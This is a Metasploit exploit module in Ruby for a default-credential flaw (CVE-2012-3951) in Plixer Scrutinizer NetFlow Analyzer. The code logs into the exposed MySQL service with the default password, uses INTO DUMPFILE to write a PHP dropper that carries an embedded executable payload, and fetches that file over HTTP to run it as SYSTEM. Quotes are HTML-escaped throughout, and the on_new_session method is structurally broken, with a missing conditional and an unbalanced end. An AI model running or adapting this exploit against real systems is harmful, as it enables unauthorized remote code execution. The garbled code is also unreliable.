# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::MYSQL
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential",
            &#039;Description&#039;    => %q{
                This exploits an insecure config found in Scrutinizer NetFlow & sFlow Analyzer.
                By default, the software installs a default password in MySQL, and binds the
                service to "0.0.0.0".  This allows any remote user to login to MySQL, and then
                gain arbitrary remote code execution under the context of &#039;SYSTEM&#039;.  Examples
                of default credentials include: &#039;scrutinizer:admin&#039;, and &#039;scrutremote:admin&#039;.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Mario Ceballos&#039;,
                    &#039;Jonathan Claudius&#039;,
                    &#039;Tanya Secker&#039;,
                    &#039;sinn3r&#039;
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-3951&#039;],
                    [&#039;OSVDB&#039;, &#039;84317&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/50074/&#039;],
                    [&#039;URL&#039;, &#039;https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;Scrutinizer NetFlow and sFlow Analyzer 9.5.2 or older&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jul 27 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new("USERNAME",  [true, &#039;The default MySQL username&#039;, &#039;scrutremote&#039;]),
                OptString.new("PASSWORD",  [true, &#039;The default MySQL password&#039;, &#039;admin&#039;]),
                OptPort.new("MYSQLPORT",   [true, &#039;The MySQL\&#039;s remote port&#039;, 3306]),
                OptPort.new("HTTPPORT",    [true, &#039;The HTTP Server\&#039;s remote port&#039;, 80]),
                OptString.new("TARGETURI", [true, &#039;The web application\&#039;s base path&#039;, &#039;/&#039;])
            ], self.class)
 
        # Both MySQL and HTTP need to use this, we&#039;ll have to register on the fly.
        deregister_options(&#039;RPORT&#039;)
    end
 
 
    def check
        tmp_rport = datastore[&#039;RPORT&#039;]
        datastore[&#039;RPORT&#039;] = datastore[&#039;HTTPPORT&#039;]
        res = send_request_raw({&#039;uri&#039;=>target_uri.host})
        datastore[&#039;RPORT&#039;] = tmp_rport
        if res and res.body =~ /\<title\>Scrutinizer\<\/title\>/ and
            res.body =~ /\<div id\=\&#039;.+\&#039;\>Scrutinizer 9\.[0-5]\.[0-2]\<\/div\>/
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
 
    def get_php_payload(fname)
        p = Rex::Text.encode_base64(generate_payload_exe)
        php = %Q|
        <?php
        $f = fopen("#{fname}", "wb");
        fwrite($f, base64_decode("#{p}"));
        fclose($f);
        exec("#{fname}");
        ?>
        |
        php = php.gsub(/^\t\t/, &#039;&#039;).gsub(/\n/, &#039; &#039;)
        return php
    end
 
 
    #
    # I wanna be able to choose my own destination... path!
    #
    def mysql_upload_binary(bindata, path)
        # Modify the rport so we can use MySQL
        datastore[&#039;RPORT&#039;] = datastore[&#039;MYSQLPORT&#039;]
 
        # Login
        h = mysql_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
 
        # The lib throws its own error message anyway:
        # "Exploit failed [no-access]: RbMysql::AccessDeniedError"
        return false if not h
 
        tmp = mysql_get_temp_dir
        p = bindata.unpack("H*")[0]
        dest = tmp + path
        mysql_query("SELECT 0x#{p} into DUMPFILE &#039;#{dest}&#039;")
        return true
    end
 
 
    def exe_php(php_fname)
        # Modify the rport so we can use HTTP
        datastore[&#039;RPORT&#039;] = datastore[&#039;HTTPPORT&#039;]
 
        # Request our payload
        path = File.dirname("#{target_uri.path}/.")
        res = send_request_raw({&#039;uri&#039;=>"#{path}#{php_fname}"})
        return (res and res.code == 200)
    end
 
 
    def cleanup
        datastore[&#039;RPORT&#039;] = @original_rport
    end
 
 
    def on_new_session(cli)
            print_error("Please remember to manually remove #{@exe_fname} and #{@php_fname}")
            return
        end
 
        cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
 
        begin
            print_status("Deleting #{@php_fname}")
            cli.fs.file.rm(@php_fname)
        rescue ::Exception => e
            print_error("Please note: #{@php_fname} is stil on disk.")
        end
 
        begin
            print_status("Deleting #{@exe_fname}")
            cli.fs.file.rm(@exe_fname)
        rescue ::Exception => e
            print_error("Please note: #{@exe_fname} is still on disk.")
        end
    end
 
 
    def exploit
        @original_rport = datastore[&#039;RPORT&#039;]
 
        #
        # Prepare our payload (naughty exe embedded in php)
        #
        @exe_fname = Rex::Text.rand_text_alpha(6) + &#039;.exe&#039;
        p = get_php_payload(@exe_fname)
 
        #
        # Upload our payload to the html directory
        #
        print_status("Uploading #{p.length.to_s} bytes via MySQL...")
        @php_fname = Rex::Text.rand_text_alpha(5) + &#039;.php&#039;
        if not mysql_upload_binary(p, "../../html/#{@php_fname}")
            print_error("That MySQL upload didn&#039;t work.")
            return
        end
 
        #
        # Execute the payload
        #
        print_status("Requesting #{@php_fname}...")
        res = exe_php(@php_fname)
 
        handler
    end
end



